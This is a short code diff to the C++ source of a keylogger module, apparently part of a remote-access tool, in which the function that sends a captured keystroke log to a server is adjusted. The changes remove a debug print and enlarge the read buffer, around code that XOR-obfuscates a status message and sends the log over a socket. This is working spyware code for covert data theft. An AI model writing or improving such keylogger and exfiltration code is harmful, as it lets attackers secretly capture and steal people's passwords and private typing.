@@ -555,7 +555,6 @@ INT Keylogger::sendLogFile()
     INT status;
     wstring data_encrypt;
     INT error_codes;
-    wcout << "stape 1 " << endl;
     //1: Test if the log file exists: 
     if(!checkIfFileExist(a_path_log_file))
     {
@@ -571,7 +570,7 @@ INT Keylogger::sendLogFile()
     else
     {
         error_codes = RATEL_ERROR_SUCCESS;
-        data_encrypt =  XOREncryption(L"MOD_KEYLOGGER:download:" SPLIT + int_to_wstring(error_codes));
+        data_encrypt = XOREncryption(L"MOD_KEYLOGGER:download:" SPLIT + int_to_wstring(error_codes));
         
         status = send(a_sock, (char *)data_encrypt.c_str(),  data_encrypt.length() * sizeof(WCHAR),0 );
         if(status == SOCKET_ERROR)
@@ -594,7 +593,7 @@ INT Keylogger::sendLogFile()
 
     //3: Read and send text in server.
 
-    CHAR buff[2048]={0};
+    CHAR buff[4096]={0};
     DWORD dwRead;
 
     while (TRUE)
